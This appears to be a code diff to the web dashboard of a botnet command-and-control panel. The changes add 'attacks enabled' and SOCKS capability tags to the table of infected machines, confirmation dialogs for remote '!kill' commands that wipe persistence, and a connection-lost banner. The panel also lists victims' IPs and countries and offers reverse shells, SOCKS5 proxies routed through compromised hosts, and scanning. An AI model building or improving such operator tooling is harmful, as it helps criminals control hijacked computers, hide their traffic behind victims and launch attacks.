@@ -28,6 +28,15 @@ function formatUplink(mbps) {
   return '<span style="color:#58a6ff">' + mbps.toFixed(1) + ' Mbps</span>';
 }
 
+function capTagsHtml(b) {
+  if (b.attacksEnabled && b.socksEnabled) {
+    return '<span class="cap-tag cap-tag-atk" title="Attacks enabled">ATK</span><span class="cap-tag cap-tag-socks" title="SOCKS enabled">SOCKS</span>';
+  }
+  if (b.attacksEnabled) return '<span class="cap-tag cap-tag-atk" title="Attacks enabled">ATK</span>';
+  if (b.socksEnabled)   return '<span class="cap-tag cap-tag-socks" title="SOCKS enabled">SOCKS</span>';
+  return '<span class="cap-tag cap-tag-none" title="No special modules">-</span>';
+}
+
 function ago(iso) {
   var d = new Date(iso), s = Math.max(0, Math.floor((Date.now() - d) / 1000));
   if (s < 5) return 'just now';
@@ -135,18 +144,30 @@ function connectSSE() {
 }
 
 var _sseRedTimer = null;
+function showSSEBanner() {
+  if (document.getElementById('sse-banner')) return;
+  var b = document.createElement('div');
+  b.id = 'sse-banner';
+  b.className = 'sse-banner';
+  b.textContent = '\u26a0\ufe0f  Live connection lost \u2014 reconnecting...';
+  document.body.appendChild(b);
+}
+
+function hideSSEBanner() {
+  var el = document.getElementById('sse-banner');
+  if (el) el.remove();
+}
+
 function updateSSEIndicator(connected) {
   clearTimeout(_sseRedTimer);
   var el = document.getElementById('sse-dot');
-  if (!el) return;
   if (connected) {
-    el.className = 'sse-indicator sse-connected';
-    el.title = 'Live connection';
+    if (el) { el.className = 'sse-indicator sse-connected'; el.title = 'Live connection'; }
+    hideSSEBanner();
   } else {
-    // Grace period before showing red — normal reconnect cycles stay green
     _sseRedTimer = setTimeout(function () {
-      el.className = 'sse-indicator sse-disconnected';
-      el.title = 'Reconnecting...';
+      if (el) { el.className = 'sse-indicator sse-disconnected'; el.title = 'Reconnecting...'; }
+      showSSEBanner();
     }, 3000);
   }
 }
@@ -350,7 +371,7 @@ function createBotRow(b) {
   var eid = b.botID.replace(/'/g, "\\'");
   tr.innerHTML =
     '<td><input type="checkbox"' + checked + ' onchange="toggleBotSelect(\'' + eid + '\',this.checked)"></td>' +
-    '<td><span class="bot-id-link" onclick="event.stopPropagation();targetBot(\'' + eid + '\')" data-tooltip="Click to set as target in Command Center">  ' + escHtml(b.botID) + '</span></td>' +
+    '<td><span class="bot-id-link" onclick="event.stopPropagation();targetBot(\'' + eid + '\')" data-tooltip="Click to set as target in Command Center" title="' + escHtml(b.botID) + '">' + escHtml(b.botID) + '</span></td>' +
     '<td style="font-family:monospace">' + escHtml(b.ip) + '</td>' +
     '<td><span class="country-badge">' + escHtml(b.country) + '</span></td>' +
     '<td>' + groupTagHtml(b.group) + '</td>' +
@@ -359,6 +380,7 @@ function createBotRow(b) {
     '<td>' + b.cpuCores + '</td>' +
     '<td>' + formatUplink(b.uplinkMbps) + '</td>' +
     '<td>' + escHtml(b.processName) + '</td>' +
+    '<td>' + capTagsHtml(b) + '</td>' +
     '<td>' + socksHtml + '</td>' +
     '<td>' + escHtml(b.uptime) + '</td>' +
     '<td class="' + h.cls + '"><span class="health-dot ' + h.dot + '"></span>' + ago(b.lastPing) + '</td>';
@@ -367,7 +389,7 @@ function createBotRow(b) {
 
 function updateBotRow(row, b) {
   var cells = row.getElementsByTagName('td');
-  if (cells.length < 13) return;
+  if (cells.length < 14) return;
   var socksHtml = b.socksActive
     ? '<span class="socks-badge socks-on"><span class="socks-dot"></span>ON</span>'
     : '<span class="socks-badge socks-off"><span class="socks-dot"></span>OFF</span>';
@@ -376,11 +398,12 @@ function updateBotRow(row, b) {
   cells[7].textContent = b.cpuCores;
   cells[8].innerHTML = formatUplink(b.uplinkMbps);
   cells[9].textContent = b.processName;
-  cells[10].innerHTML = socksHtml;
-  cells[11].textContent = b.uptime;
+  cells[10].innerHTML = capTagsHtml(b);
+  cells[11].innerHTML = socksHtml;
+  cells[12].textContent = b.uptime;
   var h = botHealth(b.lastPing);
-  cells[12].className = h.cls;
-  cells[12].innerHTML = '<span class="health-dot ' + h.dot + '"></span>' + ago(b.lastPing);
+  cells[13].className = h.cls;
+  cells[13].innerHTML = '<span class="health-dot ' + h.dot + '"></span>' + ago(b.lastPing);
   row.className = 'bot-row ' + h.row;
   row.onclick = function (ev) { if (ev.target.type === 'checkbox' || ev.target.closest('.bot-id-link')) return; openBotSidebar(b.botID); };
   row.oncontextmenu = function (ev) { ev.preventDefault(); pinBotPopup(ev, b.botID); };
@@ -422,6 +445,21 @@ function msCmd(cmd) {
   if (!ids.length) return;
   ids.forEach(function (id) { popupCmd(id, cmd); });
   showToast('Sent ' + cmd + ' to ' + ids.length + ' bots', true);
+}
+
+function msCmdFiltered(cmd, capField) {
+  var ids = Object.keys(selectedBots);
+  if (!ids.length) return;
+  var capable = ids.filter(function (id) {
+    var b = botState[id];
+    return !capField || !b || b[capField] !== false;
+  });
+  var skipped = ids.length - capable.length;
+  if (!capable.length) { showToast('No selected bots support this command', false); return; }
+  capable.forEach(function (id) { popupCmd(id, cmd); });
+  var msg = 'Sent ' + cmd + ' to ' + capable.length + ' bot' + (capable.length > 1 ? 's' : '');
+  if (skipped > 0) msg += ' \xb7 ' + skipped + ' skipped (module absent)';
+  showToast(msg, true);
 }
 
 function msScan() {
@@ -466,10 +504,18 @@ function scannerStop(type) {
 function msKill() {
   var ids = Object.keys(selectedBots);
   if (!ids.length) return;
-  if (!confirm('Kill ' + ids.length + ' bots? This cannot be undone.')) return;
-  ids.forEach(function (id) { popupCmd(id, '!kill'); });
-  selectedBots = {};
-  updateMultiSelectBar();
+  var preview = ids.slice(0, 4).map(function (id) { return {label: 'Bot', val: id}; });
+  if (ids.length > 4) preview.push({label: '', val: '\u2026and ' + (ids.length - 4) + ' more'});
+  showConfirm({
+    title: 'Kill ' + ids.length + ' bot' + (ids.length > 1 ? 's' : '') + '?',
+    message: 'Wipes persistence, deletes binary, and terminates. Cannot be undone.',
+    icon: 'danger', confirmClass: 'danger', confirmText: 'Kill All',
+    details: preview,
+    onConfirm: function () {
+      ids.forEach(function (id) { popupCmd(id, '!kill'); });
+      selectedBots = {}; updateMultiSelectBar();
+    }
+  });
 }
 
 function msOpenShells() {
@@ -712,8 +758,8 @@ function filterBotTable() {
   });
 
   var sc = document.getElementById('search-count');
-  if (q || useFilters) { sc.textContent = shown + '/' + total + ' shown'; }
-  else { sc.textContent = ''; }
+  if (q || useFilters) { sc.textContent = shown + ' / ' + total + ' bots'; }
+  else { sc.textContent = total + ' bots'; }
 }
 
 // ---------------------------------------------------------------------------
@@ -755,7 +801,7 @@ function fillPopup(b) {
   var html = '<button class="popup-act act-group" onclick="popupSetGroup(\'' + id + '\')" data-tooltip="Assign to a named group for batch targeting">' + (b.group ? 'Group: ' + escHtml(b.group) : 'Set Group') + '</button>';
   html += '<button class="popup-act act-shell" onclick="closeBotPopup();openShell(\'' + id + '\')" data-tooltip="Open interactive reverse shell">Shell</button>';
   if (b.socksActive) {
-    html += '<button class="popup-act act-stopsocks" onclick="popupCmd(\'' + id + '\',\'!stopsocks\')" data-tooltip="Terminate the running SOCKS5 proxy on this bot">Stop SOCKS</button>';
+    html += '<button class="popup-act act-stopsocks" onclick="confirmStopSocks(\'' + id + '\')" data-tooltip="Terminate the running SOCKS5 proxy on this bot">Stop SOCKS</button>';
   } else {
     html += '<button class="popup-act act-socks" onclick="popupStartSocks(\'' + id + '\')" data-tooltip="Start a SOCKS5 proxy — route your traffic through this bot">Start SOCKS</button>';
   }
@@ -847,7 +893,7 @@ function renderBotSidebar(b) {
 
   // ── Quick actions ────────────────────────────────────────────────────────
   var socksToggle = b.socksActive
-    ? '<button class="bds-btn" onclick="popupCmd(\'' + id + '\',\'!stopsocks\')" data-tooltip="Terminate the running SOCKS5 proxy on this bot">Stop SOCKS</button>'
+    ? '<button class="bds-btn" onclick="confirmStopSocks(\'' + id + '\')" data-tooltip="Terminate the running SOCKS5 proxy on this bot">Stop SOCKS</button>'
     : '<button class="bds-btn" onclick="popupStartSocks(\'' + id + '\')" data-tooltip="Start a SOCKS5 proxy — route your traffic through this bot">Start SOCKS</button>';
 
   var actions =
@@ -895,8 +941,23 @@ function popupCmd(botID, cmd) {
 }
 
 function popupKill(botID) {
-  if (!confirm('Kill bot ' + botID + '? This cannot be undone.')) return;
-  popupCmd(botID, '!kill'); closeBotPopup();
+  showConfirm({
+    title: 'Kill bot?',
+    message: 'Wipes persistence, deletes binary, and terminates. Cannot be undone.',
+    icon: 'danger', confirmClass: 'danger', confirmText: 'Kill',
+    details: [{label: 'Bot', val: botID}],
+    onConfirm: function () { popupCmd(botID, '!kill'); closeBotPopup(); }
+  });
+}
+
+function confirmStopSocks(botID) {
+  showConfirm({
+    title: 'Stop SOCKS proxy?',
+    message: 'Terminates the active SOCKS backconnect session on this bot.',
+    icon: 'warn', confirmClass: '', confirmText: 'Stop',
+    details: [{label: 'Bot', val: botID}],
+    onConfirm: function () { popupCmd(botID, '!stopsocks'); }
+  });
 }
 
 function popupStartScan(botID) {
@@ -1154,7 +1215,7 @@ function renderSocksDash() {
       '<td style="color:var(--accent);font-family:monospace">' + (b.socksRelay || '-') + '</td>' +
       '<td>' + (b.socksUser || '<span style="color:var(--text-dim)">none</span>') + '</td>' +
       '<td>' + (b.socksStarted ? ago(b.socksStarted) : '-') + '</td>' +
-      '<td><button class="socks-stop-btn" onclick="popupCmd(\'' + id + '\',\'!stopsocks\')">Stop</button></td></tr>';
+      '<td><button class="socks-stop-btn" onclick="confirmStopSocks(\'' + id + '\')">Stop</button></td></tr>';
   });
   wrap.innerHTML = html + '</tbody></table>';
 }
@@ -2861,6 +2922,9 @@ function applyTheme(theme) {
     btn.querySelector('.sun').style.display = theme === 'dark' ? 'none' : 'block';
     btn.querySelector('.moon').style.display = theme === 'dark' ? 'block' : 'none';
   }
+  // Keep the picker in sync — 'light' and 'dark' are direct keys in GLOBAL_THEMES.
+  var picker = document.getElementById('global-theme-picker');
+  if (picker) picker.value = theme;
 }
 
 function toggleTheme() {
@@ -3168,7 +3232,14 @@ function applyGlobalTheme(name) {
     picker.appendChild(opt);
   });
   var saved = localStorage.getItem('vision_global_theme');
-  if (saved && GLOBAL_THEMES[saved]) { picker.value = saved; applyGlobalTheme(saved); }
+  if (saved && GLOBAL_THEMES[saved]) {
+    picker.value = saved;
+    applyGlobalTheme(saved);
+  } else {
+    // No global theme saved — sync picker to the current light/dark data-theme.
+    var current = document.documentElement.getAttribute('data-theme') || 'dark';
+    if (GLOBAL_THEMES[current]) picker.value = current;
+  }
 })();
 
 // ============================================================================
